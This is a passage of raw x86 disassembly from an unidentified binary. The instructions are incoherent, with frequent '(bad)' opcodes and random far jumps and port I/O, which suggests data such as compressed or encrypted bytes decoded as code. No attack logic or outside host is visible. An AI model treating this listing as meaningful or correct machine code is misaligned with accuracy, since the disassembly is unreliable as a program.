  4158ed:	shr    BYTE PTR ds:0xd3d6fc8a,1
  4158f3:	xchg   DWORD PTR [ebp+0x5e0bb07],eax
  4158f9:	mov    BYTE PTR [eax+0x353594c2],cl
  4158ff:	test   BYTE PTR [ebx-0x5d],bl
  415902:	ror    DWORD PTR [ecx+0x24],cl
  415905:	xchg   BYTE PTR [edx-0x29],bh
  415908:	les    edi,FWORD PTR [ecx]
  41590a:	ins    BYTE PTR es:[edi],dx
  41590b:	and    DWORD PTR [edi-0x4e8826d9],0x23f11f9a
  415915:	xchg   edi,eax
  415916:	das    
  415917:	fwait
  415918:	add    eax,0x389a15b0
  41591d:	pop    esi
  41591e:	jecxz  0x415955
  415920:	pop    es
  415921:	scas   al,BYTE PTR es:[edi]
  415922:	pop    ebp
  415923:	loopne 0x41594a
  415925:	sub    bh,BYTE PTR [esi+eiz*4+0x2933e483]
  41592c:	ss xchg esp,eax
  41592e:	pop    ebx
  41592f:	jl     0x415921
  415931:	int3   
  415932:	xor    DWORD PTR ds:0xd3107c52,ecx
  415938:	fist   DWORD PTR [eax+0x19e0c39]
  41593e:	(bad)  
  415940:	push   ss
  415941:	inc    eax
  415942:	push   edx
  415943:	pop    edx
  415944:	cmp    DWORD PTR [ecx+ecx*4+0x9],edi
  415948:	out    0xdf,eax
  41594a:	dec    edi
  41594b:	add    edx,DWORD PTR [ebp*8+0xb8f2eb8]
  415952:	mov    al,ds:0x439a3eba
  415957:	lahf   
  415958:	fstp   DWORD PTR ds:0x95bf8ca4
  41595e:	mov    ch,0xa6
  415960:	sbb    BYTE PTR [edx],bl
  415962:	clc    
  415963:	int3   
  415964:	fdiv   DWORD PTR [eax]
  415966:	es (bad) 
  415968:	mov    bl,0x4d
  41596a:	push   esp
  41596b:	mov    ebp,DWORD PTR [bx-0x3b]
  41596f:	or     eax,0x8636a4dc
  415974:	mov    ebp,0x37d092dd
  415979:	and    edx,DWORD PTR [ecx-0x48c8e60c]
  41597f:	dec    esi
  415980:	jg     0x415957
  415982:	jmp    0xa715:0xb82f2ebf
  415989:	add    DWORD PTR [eax+0x48d96746],esp
  41598f:	mov    DWORD PTR [eax],eax
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	fbld   TBYTE PTR [eax-0x7]
  415a03:	adc    DWORD PTR [esp+eiz*8],esp
  415a06:	add    BYTE PTR [eax],al
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	cmp    DWORD PTR [edx],0x5c55f3d6
  415a12:	sbb    ecx,DWORD PTR [eax-0x6badecbe]
  415a18:	adc    eax,0x55810719
  415a1d:	xchg   esi,eax
  415a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a1f:	dec    ebx
  415a20:	and    dh,BYTE PTR [esi-0x54]
  415a23:	jae    0x415a8e
  415a25:	daa    
  415a26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a27:	pop    esi
  415a28:	loopne 0x4159f6
  415a2a:	loop   0x415a53
  415a2c:	xchg   ecx,eax
  415a2d:	int    0x6e
  415a2f:	shr    DWORD PTR [ecx+edi*4-0x5bb8b82c],cl
  415a36:	and    DWORD PTR [ebp+edi*8-0x58e1c376],esi
  415a3d:	xor    BYTE PTR [edi+0x4c62ebf],0xf7
  415a44:	mov    dl,0x69
  415a46:	inc    esi
  415a47:	sub    al,0x76
  415a49:	adc    ecx,ecx
  415a4b:	xor    BYTE PTR [edx-0xa],0xab
  415a4f:	and    al,0xf1
  415a51:	and    al,0x61
  415a53:	jmp    0x6c00dbe8
  415a58:	jno    0x415a02
  415a5a:	jmp    0x75a6:0x6a9f134c
  415a61:	in     eax,dx
  415a62:	mov    DWORD PTR [edi+0x5c],edx
  415a65:	fidivr DWORD PTR [eax+eax*4+0x59]
  415a69:	lds    esi,FWORD PTR [edi-0x22e5bda9]
  415a6f:	xchg   BYTE PTR [esi],dl
  415a71:	das    
  415a72:	idiv   DWORD PTR [edi+0x645da875]
  415a78:	in     al,0x4
  415a7a:	lods   al,BYTE PTR ds:[esi]
  415a7b:	pop    esi
  415a7c:	sbb    al,bh
  415a7e:	test   eax,0x95d5d98b
  415a83:	sbb    al,BYTE PTR [edi+esi*8]
  415a86:	(bad)  
  415a87:	dec    edi
  415a88:	ret    0x6a75
  415a8b:	and    ch,ah
  415a8d:	cmp    BYTE PTR [ebp-0x576d818d],cl
  415a93:	outs   dx,DWORD PTR ds:[esi]
  415a94:	dec    esp
  415a95:	cmp    dh,bl
  415a97:	cmp    al,0xf4
  415a99:	pop    edi
  415a9a:	cli    
  415a9b:	sbb    BYTE PTR [esi+0x69fe82d3],cl
  415aa1:	fwait
  415aa2:	pusha  
  415aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aa4:	sbb    al,0x64
  415aa6:	mov    eax,ds:0xcecef5d3
  415aab:	jl     0x415a78
  415aad:	mov    eax,ds:0x1241cb58
  415ab2:	mov    BYTE PTR [edi+0x59],dl
  415ab5:	cmp    esp,esp
  415ab7:	mov    bh,0xe7
  415ab9:	lds    esp,FWORD PTR [eax-0x3e]
  415abc:	in     al,0xb4
  415abe:	cmp    al,0xc9
  415ac0:	in     eax,0x7f
  415ac2:	add    esp,DWORD PTR [ecx-0x29]
  415ac5:	xchg   esi,eax
  415ac6:	icebp  
  415ac7:	sbb    al,0xae
  415ac9:	mov    ds:0xd550ce4f,eax
  415ace:	push   es
  415acf:	gs std 
  415ad1:	mov    eax,0x3d0b8e0b
  415ad6:	ror    bh,1
  415ad8:	rcr    BYTE PTR ds:0xa0deb69d,0x85
  415adf:	addr16 sub eax,0x116835be
  415ae5:	sahf   
  415ae6:	ret    0xf5ab
  415ae9:	test   DWORD PTR [ebp-0x71c8cd2b],eax
  415aef:	outs   dx,DWORD PTR ds:[esi]
  415af0:	mov    cl,0x8f
  415af2:	inc    esi
  415af3:	aas    
  415af4:	pop    edx
  415af5:	push   ebx
  415af6:	pop    ds
  415af7:	pop    esp
  415af8:	es xor ah,ch
  415afb:	mov    ah,0x48
  415afd:	ins    DWORD PTR es:[edi],dx
  415afe:	jno    0x415ab7
  415b00:	mov    ?,edi
  415b02:	lock or esp,ebp
  415b05:	(bad)  [eax-0x5364719a]
  415b0b:	lds    esp,FWORD PTR [esi+0x7058da]
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fadd   QWORD PTR [edi]
  415b81:	sub    edi,0xffffffb5
  415b84:	sub    ch,ah
  415b86:	add    BYTE PTR [eax],al
  415b88:	add    al,0x1
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	ins    BYTE PTR es:[edi],dx
  415b8d:	add    BYTE PTR [eax+edx*8],bl
  415b90:	mov    dh,0x91
  415b92:	fs loop 0x415b77
  415b95:	cli    
  415b96:	loope  0x415bc5
  415b98:	test   eax,0x2576f1b6
  415b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b9e:	out    0x4a,eax
  415ba0:	sub    dl,BYTE PTR [ebp+0x1f7c84b2]
  415ba6:	jb     0x415bc8
  415ba8:	stos   BYTE PTR es:[edi],al
  415ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415baa:	sub    eax,0x11fc9c4
  415baf:	push   esi
  415bb0:	call   0xcaee22f4
  415bb5:	cmp    BYTE PTR [ebp+0x6b91346f],ch
  415bbb:	loope  0x415b4e
  415bbd:	icebp  
  415bbe:	xor    eax,0x12ba6ceb
  415bc3:	ja     0x415bf5
  415bc5:	dec    ebx
  415bc6:	mov    eax,ds:0xb4624d82
  415bcb:	and    eax,0xaf4343df
  415bd0:	xchg   edx,eax
  415bd1:	jns    0x415bc1
  415bd3:	out    dx,eax
  415bd4:	in     al,0x37
  415bd6:	xor    bl,ch
  415bd8:	(bad)  [edx-0x716f9388]
  415bde:	add    ah,BYTE PTR [edi+0x6]
  415be1:	jb     0x415bfd
  415be3:	dec    edx
  415be4:	mov    ds:0x781821be,eax
  415be9:	cs aad 0x6
  415bec:	dec    esp
  415bed:	div    BYTE PTR ds:0xb324413b
  415bf3:	test   eax,0x9472cc72
  415bf8:	cmp    bl,al
  415bfa:	cmp    bl,BYTE PTR [edi+0x46626cdd]
  415c00:	(bad)  
  415c01:	pop    eax
  415c02:	cmp    DWORD PTR cs:[ebp-0x37],ebx
  415c06:	in     eax,dx
  415c07:	fwait
  415c08:	jne    0x415c6f
  415c0a:	lahf   
  415c0b:	hlt    
  415c0c:	and    esp,DWORD PTR [eax-0x4873f00b]
  415c12:	mov    eax,DWORD PTR ds:0xe6ce3a99
  415c18:	and    DWORD PTR [edi-0x16ca70],ebx
  415c1e:	xchg   edx,eax
  415c1f:	out    dx,eax
  415c20:	pop    ebp
  415c21:	test   eax,0xd5666ca9
  415c26:	inc    BYTE PTR [esi+0x5b]
  415c29:	pusha  
  415c2a:	(bad)  
  415c2b:	push   esi
  415c2c:	outs   dx,DWORD PTR ds:[esi]
  415c2d:	xchg   BYTE PTR [edi-0x40],cl
  415c30:	push   ss
  415c31:	cld    
  415c32:	xchg   ecx,eax
  415c33:	xchg   esp,eax
  415c35:	and    eax,DWORD PTR [esi]
  415c37:	fistp  QWORD PTR [eax]
  415c39:	aam    0xb
  415c3b:	sub    DWORD PTR [ecx+0x42701814],eax
  415c41:	ds mov al,0x7f
  415c44:	push   ecx
  415c45:	les    edx,FWORD PTR [ecx-0x2aed5656]
  415c4b:	nop
  415c4c:	push   ebp
  415c4d:	jg     0x415c62
  415c4f:	mov    dh,0x9a
  415c51:	adc    ebp,edi
  415c53:	adc    al,0x1a
  415c55:	push   edx
  415c56:	out    dx,eax
  415c57:	lods   eax,DWORD PTR ds:[esi]
  415c58:	inc    edx
  415c59:	or     ebx,eax
  415c5b:	scas   al,BYTE PTR es:[edi]
  415c5c:	ret    0xe6a
  415c5f:	cmp    al,0x19
  415c61:	inc    ebp
  415c62:	dec    esp
  415c63:	push   edi
  415c64:	sub    bl,bh
  415c66:	ss cld 
  415c68:	loope  0x415c4b
  415c6a:	popf   
  415c6b:	inc    ebp
  415c6c:	and    edx,DWORD PTR [edx-0x65]
  415c6f:	bound  edx,QWORD PTR [edx+0x219c8974]
  415c75:	mov    eax,0x11ced71a
  415c7a:	dec    esp
  415c7b:	imul   ebp,DWORD PTR [esi-0x615d19b7],0x4
  415c82:	dec    edi
  415c83:	fidiv  DWORD PTR [edx+0x2d]
  415c86:	mov    al,0x78
  415c88:	inc    edi
  415c89:	test   eax,0x158f2efb
  415c8e:	nop
  415c8f:	icebp  
	...
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xf7443d1f
  415d03:	xor    al,0x2c
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR [ecx+eax*1],al
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	lods   al,BYTE PTR ds:[esi]
  415d0d:	xchg   edx,eax
  415d0e:	push   cs
  415d0f:	aaa    
  415d10:	push   es
  415d11:	enter  0x1fc8,0x5
  415d15:	popa   
  415d16:	push   esi
  415d17:	retf   0xf4eb
  415d1a:	ficom  WORD PTR [edx+0x3d5b4e6d]
  415d20:	aaa    
  415d21:	ror    BYTE PTR [ecx],0xa1
  415d24:	imul   ecx,DWORD PTR [edi+edi*8+0x50],0xfffffff8
  415d29:	fstp   TBYTE PTR [ebx]
  415d2b:	push   esi
  415d2c:	push   ebx
  415d2d:	xor    ch,dh
  415d2f:	cwde   
  415d30:	loop   0x415d15
  415d32:	sti    
  415d33:	push   esi
  415d34:	or     DWORD PTR [eax+0x50751aa3],esi
  415d3a:	push   esp
  415d3b:	add    ah,0x12
  415d3e:	sub    BYTE PTR [ebp-0x5ee3e981],dh
  415d44:	inc    esp
  415d45:	cmc    
  415d46:	add    DWORD PTR [ebp-0x57],esp
  415d49:	lahf   
  415d4a:	rcr    DWORD PTR [ebp+eax*8-0x3002eb21],cl
  415d51:	inc    esp
  415d52:	addr16 (bad) 
  415d54:	sbb    eax,0x9e43dc9e
  415d59:	cs (bad) 
  415d5b:	pop    ebp
  415d5c:	push   esi
  415d5d:	pop    ecx
  415d5e:	fild   WORD PTR [esi]
  415d60:	std    
  415d61:	(bad)  
  415d62:	fcom   st(0)
  415d64:	cwde   
  415d65:	jo     0x415dc2
  415d67:	sahf   
  415d68:	xor    DWORD PTR [edx+0x639062b0],ebp
  415d6e:	and    eax,0xf1ec2726
  415d73:	stc    
  415d74:	fst    QWORD PTR [ebp-0xe]
  415d77:	sub    BYTE PTR [ebx+0x9],ch
  415d7a:	out    0xab,eax
  415d7c:	ret    
  415d7d:	push   es
  415d7e:	mov    WORD PTR [ebx+0x36429961],ds
  415d84:	mov    cl,0xe8
  415d86:	ret    
  415d87:	loop   0x415da3
  415d89:	push   esi
  415d8a:	xchg   edx,eax
  415d8b:	add    esi,DWORD PTR [esi]
  415d8d:	or     bh,BYTE PTR [eax]
  415d8f:	icebp  
  415d90:	int    0x32
  415d92:	or     al,0xb
  415d94:	cmc    
  415d95:	dec    edi
  415d96:	imul   esp,DWORD PTR [edx-0x68],0xfffffff0
  415d9a:	call   0x69d8e483
  415d9f:	mov    edi,0x68a687ea
  415da4:	cmp    eax,DWORD PTR [eax-0xf]
  415da7:	push   es
  415da8:	(bad)  
  415da9:	or     DWORD PTR [eax+0x1d4cf4ba],eax
  415daf:	nop
  415db0:	mov    dh,0x3e
  415db2:	shl    DWORD PTR [edi],cl
  415db4:	pusha  
  415db5:	pop    bp
  415db7:	bound  ecx,QWORD PTR [edi]
  415db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dba:	loopne 0x415dea
  415dbc:	push   esi
  415dbd:	addr16 out dx,eax
  415dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dc0:	in     al,dx
  415dc1:	in     al,0x62
  415dc3:	fsub   st,st(5)
  415dc5:	ds out dx,al
  415dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dc8:	sbb    ch,BYTE PTR [esi+0x41237bde]
  415dce:	xchg   esi,eax
  415dcf:	and    BYTE PTR [edx-0x12],0x5c
  415dd3:	in     al,dx
  415dd4:	cmp    DWORD PTR [edx],ecx
  415dd6:	cmp    eax,0x9b98ad93
  415ddb:	aad    0xc
  415ddd:	jnp    0x415e0a
  415ddf:	cmp    ch,cl
  415de1:	clc    
  415de2:	or     esi,esp
  415de4:	jmp    0x415dae
  415de6:	inc    esi
  415de7:	hlt    
  415de8:	jo     0x415e5a
  415dea:	cdq    
  415deb:	push   0x53362946
  415df0:	mov    dh,0x93
  415df2:	imul   edi,DWORD PTR [eax-0x5a40271f],0x5f
  415df9:	sub    eax,0x74b35c25
  415dfe:	imul   ebp,eax,0x32
  415e01:	xor    BYTE PTR [ebx+0x33],0x79
  415e05:	xlat   BYTE PTR ds:[ebx]
  415e06:	cmp    DWORD PTR [ecx+ebx*8-0x2ee12f28],ebx
  415e0d:	pushf  
  415e0e:	inc    edx
  415e0f:	jne    0x415e11
	...
  415e71:	add    BYTE PTR [eax],al
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x27]
  415e81:	addr16 mov ah,0xcc
  415e84:	xor    bh,ah
  415e86:	add    BYTE PTR [eax],al
  415e88:	add    al,0x1
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	inc    ebp
  415e8d:	out    0xec,al
  415e8f:	popf   
  415e90:	push   eax
  415e91:	xchg   esi,eax
  415e92:	mov    al,0xcf
  415e94:	test   BYTE PTR [ecx+edi*8-0x5758c3f9],0x91
  415e9c:	push   esi
  415e9d:	sbb    DWORD PTR [esi],eax
  415e9f:	fnstenv [ebx-0x19]
  415ea2:	mov    dh,0xba
  415ea4:	(bad)  
  415ea5:	push   edx
  415ea6:	add    edi,DWORD PTR [ecx+0x65ce900f]
  415eac:	pop    ecx
  415ead:	inc    ebp
  415eae:	lods   eax,DWORD PTR ds:[esi]
  415eaf:	jo     0x97689e87
  415eb5:	pop    esp
  415eb6:	and    BYTE PTR [eax-0x46976bae],dl
  415ebc:	or     ebx,DWORD PTR [ebp+0x38]
  415ebf:	sbb    eax,0x497b1139
  415ec4:	rcl    DWORD PTR [edx-0x741514f],cl
  415eca:	jl     0x415e64
  415ecc:	pop    eax
  415ecd:	push   ds
  415ece:	pop    edx
  415ecf:	les    edx,FWORD PTR [eax-0x518d55b4]
  415ed5:	push   ebx
  415ed6:	sti    
  415ed7:	jl     0x415e63
  415ed9:	cmp    edx,DWORD PTR [edx]
  415edb:	outs   dx,BYTE PTR gs:[esi]
  415edd:	mov    bh,0xdc
  415edf:	scas   eax,DWORD PTR es:[edi]
  415ee0:	mov    eax,0xc8434faa
  415ee5:	cdq    
  415ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ee7:	jmp    0x415ed6
  415ee9:	cwde   
  415eea:	cmp    al,0xa0
  415eec:	push   esi
  415eed:	lods   al,BYTE PTR ds:[esi]
  415eee:	xor    ebx,DWORD PTR [ecx]
  415ef0:	(bad)  
  415ef1:	scas   eax,DWORD PTR es:[edi]
  415ef2:	(bad)  
  415ef4:	(bad)  
  415ef6:	push   0x1e1365b9
  415efb:	int3   
  415efc:	dec    esi
  415efd:	clc    
  415efe:	cld    
  415eff:	jns    0x415e82
  415f01:	(bad)  
  415f02:	jbe    0x415f7f
  415f04:	gs ja  0x415ef0
  415f07:	dec    esi
  415f08:	out    0xe6,al
  415f0a:	jo     0x415f8a
  415f0c:	mov    ah,0x40
  415f0e:	dec    eax
  415f0f:	shr    DWORD PTR [ebx+ecx*2],1
  415f12:	adc    BYTE PTR [esi+0x24],al
  415f15:	mov    ecx,0x582eda5f
  415f1a:	nop
  415f1b:	loopne 0x415ee0
  415f1d:	mov    edi,0x626eabe4
  415f22:	or     eax,0xafe93278
  415f27:	xor    eax,0x916c7397
  415f2c:	and    al,BYTE PTR [esi+0x2]
  415f2f:	xchg   BYTE PTR [esi],al
  415f31:	mov    edx,0x3a0b7e94
  415f36:	sub    BYTE PTR [edx+0x4e],bl
  415f39:	mov    edi,0x169b78e3
  415f3e:	adc    eax,DWORD PTR [ebp+0x5f]
  415f41:	pop    ebp
  415f42:	and    al,0xc1
  415f44:	inc    esi
  415f45:	and    DWORD PTR [eax],ecx
  415f47:	push   0x65
  415f49:	sbb    ecx,DWORD PTR [edi-0x6ea8b6e6]
  415f4f:	(bad)  
  415f50:	retf   0x36f2
  415f53:	jns    0x415f40
  415f55:	push   esi
  415f56:	cdq    
  415f57:	or     bl,bl
  415f59:	or     eax,0x7389401b
  415f5e:	aaa    
  415f5f:	mov    DWORD PTR [edi+0x39cb4282],esi
  415f65:	jp     0x415f61
  415f67:	lods   al,BYTE PTR ds:[esi]
  415f68:	addr16 sub eax,0xc5baee27
  415f6e:	jbe    0x415fc6
  415f70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f71:	push   eax
  415f72:	xchg   ecx,eax
  415f73:	fld    DWORD PTR [edx+0x1]
  415f76:	pop    es
  415f77:	sbb    ebp,DWORD PTR [ecx]
  415f79:	jg     0x415f66
  415f7b:	pop    ecx
  415f7c:	sbb    edi,esi
  415f7e:	es xchg esi,eax
  415f80:	test   eax,0x24ff71b7
  415f85:	or     esi,ecx
  415f87:	imul   eax,ebp,0x66
  415f8a:	jae    0x415f4f
  415f8c:	pop    esi
  415f8d:	ficomp DWORD PTR [edx+0xd5]
	...
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	pusha  
  416001:	js     0x415f91
  416003:	push   0x34
  416005:	call   0x145600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	jne    0x416057
  41600e:	into   
  41600f:	sbb    BYTE PTR [ecx-0x52],cl
  416012:	inc    edi
  416013:	mov    esp,0xfea8c712
  416018:	fisub  WORD PTR [esi]
  41601a:	mov    eax,ds:0x16092889
  41601f:	adc    al,0xd4
  416021:	push   eax
  416022:	adc    BYTE PTR [ecx-0x4270e2e8],0xee
  416029:	ins    BYTE PTR es:[edi],dx
  41602a:	fsub   DWORD PTR ds:0xe71b3f38
  416030:	data16 mov BYTE PTR [esi-0x7d1df43d],dh
  416037:	xor    DWORD PTR [ebx-0x16a0ca28],0x7f
  41603e:	dec    edi
  41603f:	fcom   st(5)
  416041:	dec    ebx
  416042:	and    dl,BYTE PTR [eax+0x1e]
  416045:	aad    0x3e
  416047:	scas   eax,DWORD PTR es:[edi]
  416048:	fnstcw WORD PTR [eax+0x2c60b44f]
  41604e:	cmp    dh,ah
  416050:	mov    bh,0xdc
  416052:	xchg   esp,eax
  416053:	out    dx,eax
  416054:	cmp    DWORD PTR [edx],ebx
  416056:	daa    
  416057:	mov    esi,0x85a2e089
  41605c:	jno    0x41609c
  41605e:	(bad)  
  41605f:	in     al,0x94
  416061:	lea    ebx,[edx]
  416063:	ficomp DWORD PTR [ebp-0x51]
  416066:	fwait
  416067:	and    dh,BYTE PTR [ebx-0x12cac733]
  41606d:	aas    
  41606e:	dec    edx
  41606f:	aas    
  416070:	dec    eax
  416071:	in     al,dx
  416072:	aaa    
  416073:	mov    bl,0xa5
  416075:	lea    eax,[ebp+0x47f0ac82]
  41607b:	push   0x171fcd38
  416080:	dec    ebp
  416081:	pop    esp
  416082:	push   0xfffffff3
  416084:	lods   eax,DWORD PTR ds:[esi]
  416085:	dec    edi
  416086:	(bad)  
  416088:	and    DWORD PTR [ebx+0x7e],0x7cdf6dfd
  41608f:	add    bl,ah
  416091:	pop    ebx
  416092:	sbb    ch,BYTE PTR [edx+0x7edf9093]
  416098:	mov    bl,0xfa
  41609a:	push   ebp
  41609b:	lods   al,BYTE PTR ds:[esi]
  41609c:	pop    ds
  41609d:	fdivr  DWORD PTR [eax-0x20873894]
  4160a3:	pushf  
  4160a4:	and    BYTE PTR [ebx-0x743acd4b],0xce
  4160ab:	in     eax,dx
  4160ac:	adc    eax,0x171ceb3d
  4160b1:	lahf   
  4160b2:	xor    ah,cl
  4160b4:	pop    edx
  4160b5:	mov    eax,0xd138f554
  4160ba:	push   ecx
  4160bb:	mov    al,ds:0x1a250831
  4160c0:	inc    esp
  4160c1:	call   0x23ec31bf
  4160c6:	sub    ecx,eax
  4160c8:	and    al,0x3a
  4160ca:	push   eax
  4160cb:	sub    al,0x18
  4160cd:	mov    cl,0x11
  4160cf:	pusha  
  4160d0:	push   eax
  4160d1:	scas   eax,DWORD PTR es:[edi]
  4160d2:	sbb    al,0xd8
  4160d4:	ds repnz mov esi,0x5a41f1d2
  4160db:	jecxz  0x416070
  4160dd:	jnp    0x416096
  4160df:	(bad)  
  4160e0:	sti    
  4160e1:	mov    dh,0xf7
  4160e3:	aam    0x4b
  4160e5:	inc    ebp
  4160e6:	xchg   ebp,eax
  4160e7:	gs push edi
  4160e9:	cli    
  4160ea:	ds and cl,dh
  4160ed:	jmp    0xfc74:0x34d78b6a
  4160f4:	retf   0xce5b
  4160f7:	push   ecx
  4160f8:	xchg   esi,eax
  4160f9:	adc    cl,BYTE PTR [ebx-0x2e]
  4160fc:	push   cs
  4160fd:	push   es
  4160fe:	push   cs
  4160ff:	jnp    0x4160c2
  416101:	dec    ebp
  416102:	loopne 0x4160ee
  416104:	push   edx
  416105:	clc    
  416106:	in     al,0x5a
  416108:	xchg   BYTE PTR [ebx+edx*2],dl
  41610b:	add    BYTE PTR [ecx+0x3d],bl
  41610e:	dec    esp
  41610f:	mov    ebx,0x0
	...
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0x6f5aebf3
  416183:	jns    0x4161bd
  416185:	jmp    0x145618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	ret    
  41618d:	mov    ds:0x8b7e223c,al
  416192:	mov    dh,0x3b
  416194:	call   0x55a3:0xb2e02ec2
  41619b:	fsub   QWORD PTR ds:[edi]
  41619e:	sub    DWORD PTR [edx-0x1dc1c07a],edi
  4161a4:	pop    ebp
  4161a5:	cmp    ch,BYTE PTR [edx]
  4161a7:	mov    ds:0x66ae6088,eax
  4161ac:	mov    eax,ds:0x8f251dcc
  4161b1:	or     esp,esp
  4161b3:	add    cl,bl
  4161b5:	cmp    ecx,edx
  4161b7:	aad    0x1a
  4161b9:	jae    0x416205
  4161bb:	adc    cl,BYTE PTR [ecx-0x10]
  4161be:	mov    bl,0xbc
  4161c0:	js     0x4161fa
  4161c2:	test   eax,0x22809bfa
  4161c7:	inc    edx
  4161c8:	mov    ch,0xd5
  4161ca:	call   0x593c:0xd058e8d1
  4161d1:	in     al,dx
  4161d2:	sbb    DWORD PTR [ebx],eax
  4161d4:	xchg   ecx,eax
  4161d5:	xor    al,0x5b
  4161d7:	or     edi,DWORD PTR [eax+0x53]
  4161da:	xchg   edi,eax
  4161db:	adc    DWORD PTR [edi-0x34eaecc],esp
  4161e1:	shl    DWORD PTR [eax],cl
  4161e3:	pop    edx
  4161e4:	hlt    
  4161e5:	pop    edi
  4161e6:	ficomp DWORD PTR [ecx]
  4161e8:	xchg   ecx,eax
  4161e9:	icebp  
  4161ea:	add    eax,0x49b11bd8
  4161ef:	je     0x4161a1
  4161f1:	mul    BYTE PTR [edx]
  4161f3:	push   ss
  4161f4:	xchg   BYTE PTR ds:0x5863f93b,ah
  4161fa:	mov    BYTE PTR [esi+eiz*1+0x6ecf79fe],ah
  416201:	iret   
  416202:	sti    
  416203:	and    eax,0x5e254263
  416208:	jl     0x416262
  41620a:	int3   
  41620b:	bound  ebp,QWORD PTR [ebx-0x1c]
  41620e:	shl    BYTE PTR [eax],0x23
  416211:	imul   eax,DWORD PTR [ebx-0x41],0x136c88c
  416218:	(bad)
  41621b:	xor    DWORD PTR [edi+0x5f6a217a],ecx
  416221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416222:	sbb    DWORD PTR [esi],ebp
  416224:	dec    eax
  416225:	sbb    edx,edx
  416227:	ss pop edi
  416229:	clc    
  41622a:	push   ebx
  41622b:	add    bl,0xa0
  41622e:	(bad)  [ebp-0x4bbe1df0]
  416234:	mov    esp,0xbb3aa505
  416239:	jle    0x41623b
  41623b:	cmp    eax,0x63180d32
  416240:	loopne 0x416278
  416242:	pop    ebx
  416243:	out    0x3,al
  416245:	push   0xd40af1f6
  41624a:	pop    es
  41624b:	jbe    0x4162ac
  41624d:	cli    
  41624e:	xchg   BYTE PTR [edx],bh
  416250:	sti    
  416251:	or     al,0x1f
  416253:	sbb    BYTE PTR [esi+0x4f910ed4],0xf5
  41625a:	pop    edi
  41625b:	cli    
  41625c:	ss mov esp,0x771ce854
  416262:	mov    esp,0x2535152
  416267:	aaa    
  416268:	sbb    eax,0xe203166d
  41626d:	ret    0xb15d
  416270:	sub    al,0x5c
  416272:	dec    edx
  416273:	and    cl,BYTE PTR [eax]
  416275:	sahf   
  416276:	mov    esi,0xd9cbf116
  41627b:	arpl   WORD PTR [esi+edi*2-0x5f],bp
  41627f:	ds inc esp
  416281:	gs dec eax
  416283:	es push cs
  416285:	iret   
  416286:	pushf  
  416287:	jg     0x41620a
  416289:	dec    ebx
  41628a:	push   0xf566011c
  41628f:	fild   WORD PTR [eax]
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3c7f:0x6f08d4ee
  416305:	jmp    0x0:0x1040000
  41630c:	mov    dh,0x6a
  41630e:	mov    dl,0x16
  416310:	pop    es
  416311:	adc    DWORD PTR ds:0x82679fbf,eax
  416317:	cmp    eax,0x26b6d92e
  41631c:	pop    esp
  41631d:	stos   WORD PTR es:[edi],ax
  41631f:	push   es
  416320:	sub    al,0x71
  416322:	ret    0x141d
  416325:	or     eax,0xf88e7b8a
  41632a:	xchg   esp,eax
  41632b:	xor    BYTE PTR [eax],0xaa
  41632e:	mov    ebp,0xbdbe4b0
  416333:	daa    
  416334:	pop    esp
  416335:	repnz std 
  416337:	mov    ecx,0x55db3474
  41633c:	mov    ecx,0xe987ec4b
  416341:	loopne 0x4162d6
  416343:	pop    ebx
  416344:	pusha  
  416345:	cs cwde 
  416347:	mov    bl,0xd7
  416349:	nop
  41634a:	dec    edx
  41634b:	and    al,0x76
  41634d:	pop    ebp
  41634e:	jns    0x4162fa
  416350:	xor    al,0xf3
  416352:	jnp    0x41633e
  416354:	ficomp DWORD PTR [edx-0x1c]
  416357:	cmp    al,0xc
  416359:	js     0x416314
  41635b:	mul    DWORD PTR [esp+ecx*4+0x66]
  41635f:	stos   BYTE PTR es:[edi],al
  416360:	call   FWORD PTR [ecx-0x3ff1544e]
  416366:	push   0x95e37b31
  41636b:	fisttp WORD PTR [ebx+0x1d]
  41636e:	jmp    0x41632e
